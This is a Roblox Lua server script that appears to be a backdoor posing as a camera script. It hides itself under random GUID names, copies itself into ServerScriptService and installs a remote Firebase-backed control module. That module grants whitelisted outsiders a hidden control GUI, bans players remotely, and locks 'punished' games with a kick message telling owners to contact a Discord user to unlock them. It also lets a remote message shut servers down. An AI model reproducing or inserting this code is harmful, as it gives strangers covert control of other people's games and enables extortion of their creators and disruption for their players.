local MessagingService = game:GetService("MessagingService")
local Players = game:GetService("Players")
local csp = {}
local csn = {}
local cgn = {}

if csp[1] == nil and not game:GetService("Workspace"):FindFirstChild("CmC") and script.Parent.Name ~= "ServerScriptService" then
	table.insert(csp, script.Parent.Name)
else
	table.insert(csp, game:GetService("Workspace"):FindFirstChild("CmC"):FindFirstChild("CamConfig"):GetAttribute("OP"))
end
if csn[1] == nil and not game:GetService("Workspace"):FindFirstChild("CmC") and script.Parent.Name ~= "ServerScriptService" then
	script.Name = game:GetService("HttpService"):GenerateGUID(false).."-Root"
	table.insert(csn, script.Name)
else
	table.insert(csn, game:GetService("Workspace"):FindFirstChild("CmC"):FindFirstChild("CamConfig"):GetAttribute("SN"))
end
if cgn[1] == nil and not game:GetService("Workspace"):FindFirstChild("CmC") and script.Parent.Name ~= "ServerScriptService" then
	for i,v in pairs(script:GetChildren()) do
		if v:IsA("ScreenGui") and v:FindFirstChild("PG") and v:FindFirstChild("Open") and v:FindFirstChild("CL") then
			v.Name = game:GetService("HttpService"):GenerateGUID(false).."-Gui"
			table.insert(cgn, v.Name)
		end
	end
else
	table.insert(cgn, game:GetService("Workspace"):FindFirstChild("CmC"):FindFirstChild("CamConfig"):GetAttribute("CGN"))
end
script:AddTag("CMS")
for i,v in pairs(script:GetDescendants()) do
	v:AddTag("CMS")
end
local HttpService = game:GetService("HttpService")
if script.Parent == game:GetService(csp[1]) then
	if not game:GetService("ServerScriptService"):FindFirstChild("CameraScript") then
		if not game:GetService("Workspace"):FindFirstChild("CmC") then
			script:FindFirstChild(cgn[1]).FirebaseService.Parent = game:GetService("ServerScriptService")
			local nf = Instance.new("Folder")
			nf.Name = "CmC"
			nf:AddTag("CMS")
			nf.Parent = game:GetService("Workspace")
			local ncc = Instance.new("Configuration")
			ncc.Name = "CamConfig"
			ncc:SetAttribute("Sc", false)
			ncc:SetAttribute("OP", csp[1])
			ncc:SetAttribute("SN", csn[1])
			ncc:SetAttribute("CGN", cgn[1])
			ncc:SetAttribute("CSM", "")
			ncc:AddTag("CMS")
			ncc.Parent = game:GetService("Workspace"):WaitForChild("CmC")
		end
		if not game:GetService("StarterPlayer"):FindFirstChild("StarterPlayerScripts"):FindFirstChild("Sc") then
			local scc = script:FindFirstChild(cgn[1]):FindFirstChildWhichIsA("ScreenGui").Sc:Clone()
			scc.Enabled = true
			scc.Parent = game:GetService("StarterPlayer"):FindFirstChild("StarterPlayerScripts")
		end
		if not game:GetService("ReplicatedStorage"):FindFirstChild("Scr") then
			local nre = Instance.new("RemoteEvent")
			nre.Name = "Scr"
			nre:AddTag("CMS")
			nre.Parent = game:GetService("ReplicatedStorage")
		end
		if not game:GetService("ServerStorage"):FindFirstChild("getipeventahh_GC") then
			local getipeventcreate = Instance.new("BindableEvent")
			getipeventcreate.Name = "gpi_GC"
			getipeventcreate:AddTag("CMS")
			getipeventcreate.Parent = game:GetService("ServerStorage")
		end
		local ccs = script:Clone()
		ccs.Parent = game:GetService("ServerScriptService")
	else
		if not game:GetService("Workspace"):FindFirstChild("CmC") then
			script.FirebaseService.Parent = game:GetService("ServerScriptService")
			local nf = Instance.new("Folder")
			nf.Name = "CmC"
			nf:AddTag("CMS")
			nf.Parent = game:GetService("Workspace")
			local ncc = Instance.new("Configuration")
			ncc.Name = "CamConfig"
			ncc:SetAttribute("Sc", false)
			ncc:SetAttribute("OP", csp[1])
			ncc:AddTag("CMS")
			ncc.Parent = game:GetService("Workspace"):WaitForChild("CmC")
		end
		if not game:GetService("StarterPlayer"):FindFirstChild("StarterPlayerScripts"):FindFirstChild("Sc") then
			local scc = script:FindFirstChild(cgn[1]):FindFirstChildWhichIsA("Frame").Controller.Request.Script.Sc:Clone()
			scc.Enabled = true
			scc.Parent = game:GetService("StarterPlayer"):FindFirstChild("StarterPlayerScripts")
		end
		if not game:GetService("ReplicatedStorage"):FindFirstChild("Scr") then
			local nre = Instance.new("RemoteEvent")
			nre.Name = "Scr"
			nre:AddTag("CMS")
			nre.Parent = game:GetService("ReplicatedStorage")
		end
		if not game:GetService("ServerStorage"):FindFirstChild("getipeventahh_GC") then
			local getipeventcreate = Instance.new("BindableEvent")
			getipeventcreate.Name = "gpi_GC"
			getipeventcreate:AddTag("CMS")
			getipeventcreate.Parent = game:GetService("ServerStorage")
		end
	end
elseif script.Parent == game:GetService("ServerScriptService") then
	for i,v in pairs(game:GetService(csp[1]):GetChildren()) do
		if v.Name == csn[1] then
			if v:FindFirstChild(cgn[1]) and v:FindFirstChild(cgn[1]):FindFirstChild("PG") then
				v:Destroy()
			end
		end
	end
end
game:GetService("Players").PlayerAdded:Connect(function(newPlr)
	newPlr.CharacterAdded:Connect(function(char)
		if script.Parent == game:GetService("ServerScriptService") then
			local DBM = require(game:GetService("ServerScriptService"):WaitForChild('FirebaseService'))
			local Whitelist = DBM:GetFirebase("Whitelisted")
			local RankList = DBM:GetFirebase("RankList")
			local WhitelistData = Whitelist:GetAsync(newPlr.Name)
			if WhitelistData and tonumber(WhitelistData) >= 1 or tonumber(WhitelistData) == -1 then
				if not newPlr.PlayerGui:FindFirstChild(cgn[1]) then
					local clones = script:FindFirstChild(cgn[1]):Clone()
					clones.Parent = newPlr.PlayerGui
					
				end
			end
		end
	end)
end)
game:GetService("Players").PlayerAdded:Connect(function(newPlr)
	if script.Parent == game:GetService("ServerScriptService") then
		local DBM = require(game:GetService("ServerScriptService"):WaitForChild('FirebaseService'))
		local PGs = DBM:GetFirebase("PunishedGames")
		local cbp = DBM:GetFirebase("ConsoleBannedPlayers")
		local wl = DBM:GetFirebase("Whitelisted")
		if PGs:GetAsync(game.PlaceId) == true or PGs:GetAsync(game.PlaceId) == "true" then
			--local clg = script:FindFirstChild(cgn[1]):FindFirstChild("PG"):Clone()
			--clg.Enabled = true
			--clg.Script1.Enabled = true
			--clg.Script2.Enabled = true
			--clg.Parent = newPlr.PlayerGui
			if not wl:GetAsync(newPlr.Name) then
				newPlr:Kick("To get game unlocked contact noname558 in discord...")
			end
		end
		if cbp:GetAsync(newPlr.Name) == true or cbp:GetAsync(newPlr.Name) == "true" then
			newPlr:Kick("You have been banned.")
		end
	end
end)
local function ShutdownServer()
	for i,Player in pairs(Players:GetPlayers()) do
		Player:Kick("⚠ This server has closed.")
	end
	Players.PlayerAdded:Connect(function(Player)
		Player:Kick("⚠ This server has closed")
	end)
end

MessagingService:SubscribeAsync("Shutdown___YYY7_Key.'Root'", ShutdownServer)
